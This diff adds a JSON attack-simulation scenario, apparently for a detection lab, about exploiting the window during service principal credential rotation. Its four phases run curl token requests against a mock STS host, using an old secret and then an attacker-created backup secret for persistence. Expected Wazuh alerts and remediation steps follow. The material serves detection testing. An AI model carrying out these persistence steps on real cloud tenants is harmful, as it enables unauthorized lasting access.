@@ -1,0 +1,134 @@
+{
+  "id": "S8-05",
+  "name": "Service Principal Credential Rotation Race Condition",
+  "category": "OAuth/OIDC",
+  "version": "1.0",
+  "description": "Attacker exploits the timing window during service principal credential rotation to maintain access using old credentials and create backup credentials before the rotation completes",
+  "difficulty": "Expert",
+  "real_world_relevance": "Azure AD service principal rotation gaps exploited by APT29, race conditions in AWS IAM key rotation allowing dual-key persistence, Kubernetes service account token rotation gaps",
+
+  "mitre_attack": {
+    "tactics": ["Persistence", "Credential Access"],
+    "techniques": [
+      {"id": "T1098", "name": "Account Manipulation"},
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cloud-workload", "mock-sts-federation"],
+    "network": "cloud_net",
+    "profile": "oauth-oidc"
+  },
+
+  "attack_flow": {
+    "description": "Attacker monitors service principal credential rotation and exploits the window where both old and new credentials are valid to create backup credentials for persistence",
+    "diagram": [
+      "1. Attacker has access to service principal credentials (obtained via earlier compromise)",
+      "2. Monitor for credential rotation events (new secret added to SP)",
+      "3. Use old credential during rotation window before it is revoked",
+      "4. Create an additional client secret on the service principal",
+      "5. Maintain persistence via the backup credential after rotation completes"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Credential Rotation Monitoring",
+      "description": "Detect credential rotation in progress on the service principal",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=old-credential-being-rotated&scope=https://management.azure.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Old credential still valid during rotation window'",
+          "description": "Test if old credential is still accepted during rotation window"
+        }
+      ]
+    },
+    {
+      "name": "Race Condition Exploitation",
+      "description": "Use old credential during rotation window to authenticate",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=old-credential-being-rotated&scope=https://graph.microsoft.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Race condition token request'",
+          "description": "Authenticate with old credential during rotation window"
+        }
+      ]
+    },
+    {
+      "name": "Backup Credential Creation",
+      "description": "Create additional client secret on the service principal for persistence",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=attacker-created-backup-secret&scope=Application.ReadWrite.All&action=addPassword' 2>/dev/null | python3 -m json.tool || echo 'Backup credential creation attempted'",
+          "description": "Create additional SP secret for persistence via backup credential"
+        }
+      ]
+    },
+    {
+      "name": "Persistence Verification",
+      "description": "Verify persistent access via the backup credential",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cloud-workload",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=attacker-created-backup-secret&scope=https://management.azure.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Backup credential verification'",
+          "description": "Authenticate with backup credential to verify persistent access"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "STS Federation Logs",
+      "description": "Service principal credential created during rotation window",
+      "wazuh_rule": "100977"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100977",
+      "level": 13,
+      "description": "NHI: Service principal credential created during rotation window"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Audit all credentials on the affected service principal and remove unauthorized ones",
+      "Immediately revoke old credentials rather than allowing grace periods",
+      "Review Azure AD audit logs for addPassword operations during rotation windows"
+    ],
+    "long_term": [
+      "Implement zero-downtime rotation with immediate old credential revocation",
+      "Monitor for addPassword and addKey operations on service principals",
+      "Use managed identities or workload identity federation instead of client secrets",
+      "Implement alerts on multiple valid credentials for a single service principal"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1098 - Account Manipulation",
+      "url": "https://attack.mitre.org/techniques/T1098/"
+    },
+    {
+      "title": "Azure AD Service Principal Security Best Practices",
+      "url": "https://learn.microsoft.com/en-us/azure/active-directory/develop/howto-create-service-principal-portal"
+    },
+    {
+      "title": "APT29 OAuth Token Abuse",
+      "url": "https://www.mandiant.com/resources/blog/apt29-oauth-abuse"
+    }
+  ]
+}
